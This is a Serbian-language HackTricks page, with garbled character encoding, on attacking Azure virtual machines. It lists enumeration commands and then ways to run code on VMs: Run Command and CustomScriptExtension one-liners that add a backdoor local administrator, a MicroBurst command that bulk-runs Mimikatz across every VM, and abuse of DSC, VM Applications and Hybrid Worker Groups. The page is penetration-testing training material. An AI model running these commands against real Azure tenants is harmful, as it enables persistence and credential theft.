# Az - Virtuelne maÅ¡ine i mreÅ¾a

{% hint style="success" %}
NauÄite i veÅ¾bajte hakovanje AWS-a:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
NauÄite i veÅ¾bajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Osnovne informacije

[Od dokumenata:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure virtuelne maÅ¡ine su jedan od nekoliko tipova [resursa za raÄunanje koji se mogu skalirati po potrebi](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) koje Azure nudi. ObiÄno birate virtuelnu maÅ¡inu kada vam je potrebna veÄ‡a kontrola nad raÄunarskim okruÅ¾enjem nego Å¡to to nude ostale opcije. Ovaj Älanak pruÅ¾a informacije o tome Å¡ta treba da uzmete u obzir pre nego Å¡to kreirate virtuelnu maÅ¡inu, kako je kreirate i kako je upravljate.

## Azure mreÅ¾ne informacije

Azure mreÅ¾e sadrÅ¾e **razliÄite entitete i naÄine konfigurisanja.** MoÅ¾ete pronaÄ‡i kratke **opise,** **primere** i **komande za enumeraciju** razliÄitih entiteta Azure mreÅ¾e u:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** nudi sigurno, potpuno upravljano reÅ¡enje za pristup preko RDP (Remote Desktop Protocol) i SSH (Secure Shell) preko SSL-a putem Azure portala. Integriran je unutar Azure virtuelne mreÅ¾e, omoguÄ‡avajuÄ‡i RDP i SSH povezivost sa VM-ovima koristeÄ‡i privatne IP adrese, izbegavajuÄ‡i potrebu za javnim IP adresama. Ovo ga Äini sigurnijom, praktiÄnijom alternativom tradicionalnim metodama koje ukljuÄuju dodeljivanje javnih IP adresa i konfiguracije pravila NSG za pristup VM-ovima. Razvojni inÅ¾enjeri i IT osoblje mogu sigurno pristupiti VM-ovima sa Azure portala koristeÄ‡i svoje web pretraÅ¾ivaÄe, olakÅ¡avajuÄ‡i proces za razvojna i testna okruÅ¾enja.

Da biste videli sve Azure Bastion Host-ove u vaÅ¡oj pretplati, moÅ¾ete koristiti sledeÄ‡u komandu:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## Enumeracija virtuelnih maÅ¡ina
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Pokretanje komandi u virtuelnoj maÅ¡ini**

### **AAD prijava u virtuelnoj maÅ¡ini**

MoguÄ‡e je omoguÄ‡iti pristup korisnicima koji su autentifikovani putem AzureAD. Na primer, pokuÅ¡avajuÄ‡i pristupiti **linux virtuelnoj maÅ¡ini**: `ssh korisniÄkoime@azure-corp.com@1.1.1.1` (vaÅ¾no je **koristiti email** sa azurecorp koji je koriÅ¡Ä‡en prilikom pokuÅ¡aja prijave) moÅ¾ete dobiti greÅ¡ku kao Å¡to je:
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Samo **pratite te instrukcije** odlaskom na [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) i navoÄ‘enjem koda, koristite email i lozinku kao akreditive i biÄ‡ete u moguÄ‡nosti da se poveÅ¾ete putem SSH-a (ako taj korisnik ima dovoljno dozvola da to uradi: `Virtual Machine Administrator Login` ili `Virtual Machine User Login` uloga).

### **Pokreni komandu**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Pokreni proÅ¡irenje prilagoÄ‘enog skripta**

ProÅ¡irenja virtuelne maÅ¡ine (VM) u Azure-u su **male aplikacije** koje pruÅ¾aju konfiguraciju nakon implementacije i automatizaciju **zadataka** na **Azure VM-ovima**. Na primer, ako virtuelna maÅ¡ina zahteva instalaciju softvera, zaÅ¡titu od virusa ili moguÄ‡nost pokretanja skripta unutar nje, moÅ¾ete koristiti proÅ¡irenje VM-a.

Stoga, ako imate pristup za pisanje, moÅ¾ete izvrÅ¡iti proizvoljan kod:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### Å½eljenoStanjeKonfiguracije (DSC)

Å½eljenoStanjeKonfiguracije (DSC) je alatka u PowerShell-u sliÄna Ansible-u, koriÅ¡Ä‡ena za postavljanje hosta putem koda. DSC se integriÅ¡e sa Azure-om, omoguÄ‡avajuÄ‡i otpremanje specifiÄnih konfiguracionih fajlova. Ovi fajlovi moraju biti u skladu sa strogo definisanim sintaksom. VaÅ¾no je napomenuti da DSC ekstenzija u Azure-u moÅ¾e izvrÅ¡avati komande iz fajlova koji ispunjavaju odreÄ‘ene kriterijume formatiranja, Äak i ako sintaksa nije ispravna prema DSC standardima, kao Å¡to je prikazano na priloÅ¾enoj slici.

IzvrÅ¡avanje ovih komandi olakÅ¡ano je kroz funkciju [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) u Az PowerShell-u. Zahtevi ukljuÄuju **.PS1** fajl sa definisanom funkcijom i fajl mora biti zapakovan u **.zip** fajl. Iako sintaksa moÅ¾da nije taÄna za DSC, kod Ä‡e i dalje biti izvrÅ¡en. MeÄ‘utim, ekstenzija Ä‡e oznaÄiti status izvrÅ¡avanja kao "neuspeh", i nijedan izlaz iz komande neÄ‡e biti vidljiv zbog toga Å¡to je status prebrisao poruku o neuspehu.

### Definicije Aplikacija na VM-ovima

Definicije Aplikacija na VM-ovima omoguÄ‡avaju ponovljivo implementiranje verzionisanih aplikacija na Azure VM-ove. Ovaj resurs podrÅ¾ava implementaciju i aÅ¾uriranje aplikacija na VM-ovima. Za postavljanje ovoga, potrebno je sprovesti nekoliko koraka, ukljuÄujuÄ‡i komande poput **`New-AzGalleryApplication`** i **`New-AzGalleryApplicationVersion`** u Az PowerShell-u.

IzvrÅ¡avanje aplikacija ili komandi putem ovog metoda ukljuÄuje **"VMAppExtension"**, koji se automatski instalira kada se aplikacija primeni na VM. Ekstenzija preuzima fajl sa odreÄ‘enog URI-ja i naziva ga taÄno kao aplikacija, bez ekstenzije. Da bi se fajl pravilno izvrÅ¡io, polje "ManageActions" u REST API pozivu mora biti konfigurisano da preimenuje fajl sa odgovarajuÄ‡om ekstenzijom. Postavljanje ovog metoda, kada je zavrÅ¡eno, Ä‡e liÄiti na strukturu prikazanu na priloÅ¾enoj slici.

MeÄ‘utim, ovaj metod izvrÅ¡avanja je relativno spor, potrebno je oko 3-4 minuta da se izvrÅ¡i aplikacija ili komanda. Fajlovi vezani za ovaj proces se Äuvaju u specifiÄnim direktorijumima (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` za kopiranje aplikacije i `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` za status izvrÅ¡avanja).

Oba tehnika pruÅ¾aju jedinstvene naÄine izvrÅ¡avanja komandi i implementiranja aplikacija u Azure okruÅ¾enjima, svaki sa svojim setom zahteva, koraka i razmatranja.

### Grupa Hibridnih Radnih Grupa (HWGs) u Azure-u

[**Hibridne Radne Grupe (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) su funkcionalnost u Azure-u koja omoguÄ‡ava Runbook-ove, konfigurisane u Automation Account-u, da se izvrÅ¡e na Azure Virtual Machine (VM) koja je deo odreÄ‘ene HWG. Ovo izvrÅ¡avanje je olakÅ¡ano kroz ekstenziju instaliranu na VM-u, koja implementira Runbook kod na VM. ZnaÄajan aspekt ovog procesa je da stvarne akreditacije nisu faktor u izvrÅ¡avanju jer kod radi sa poviÅ¡enim privilegijama, specifiÄno kao **SYSTEM** ili root, kao Å¡to je ilustrovano na priloÅ¾enoj slici.

VaÅ¾an detalj za one koji koriste Windows 10 VM-ove je neophodnost specificiranja PowerShell verzije za Runbook. Trebalo bi postaviti da se izvrÅ¡ava kao PowerShell Verzija 5.1 umesto 7.1. Ovaj zahtev proizilazi iz Äinjenice da PowerShell 7.1 nije instaliran podrazumevano na ovim VM-ovima, Å¡to dovodi do neuspeha u izvrÅ¡avanju skripta ako je specificirana verzija 7.1.

Ova funkcionalnost Azure-a nudi robustan metod za automatizaciju i upravljanje zadacima Å¡irom hibridnih okruÅ¾enja, omoguÄ‡avajuÄ‡i centralizovano upravljanje i izvrÅ¡avanje zadataka na Azure VM-ovima.


## Reference

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)
